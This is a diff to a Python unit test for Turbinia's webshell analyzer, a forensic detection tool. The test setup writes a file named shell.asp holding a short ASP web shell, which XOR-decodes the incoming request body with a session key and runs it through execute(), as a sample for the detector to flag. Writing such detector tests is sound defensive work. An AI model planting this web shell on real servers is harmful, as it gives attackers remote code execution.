@@ -28,10 +28,25 @@ class WebshellAnalyzerTaskTest(TestTurbiniaTaskBase):
     super(WebshellAnalyzerTaskTest,
           self).setUp(task_class=webshell_analyzer.WebshellAnalyzerTask)
     self.setResults(mock_run=False)
-    filedir = os.path.dirname(os.path.realpath(__file__))
-    print(filedir)
-    self.evidence.local_path = os.path.join(filedir, '..', '..', 'test_data')
     self.task.output_dir = self.task.base_output_dir
+    self.evidence.local_path = self.task.output_dir
+    temp_evidence = self.evidence.local_path + '/' + 'var'
+    os.mkdir(temp_evidence)
+    shellfile = 'shell.asp'
+    shell_file_to_write = os.path.join(temp_evidence, shellfile)
+
+    shell = "Response.CharSet = \"UTF-8\" \
+             Session(\"k\")=k\
+             k=Session(\"k\")\
+             size=Request.TotalBytes\
+             content=Request.BinaryRead(size)\
+             For i=1 To size\
+             result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\
+             Next\
+             execute(result)"
+
+    with open(shell_file_to_write, 'w') as write_shell:
+      write_shell.write(shell)
 
   def tearDown(self):
     if os.path.exists(self.task.output_dir):
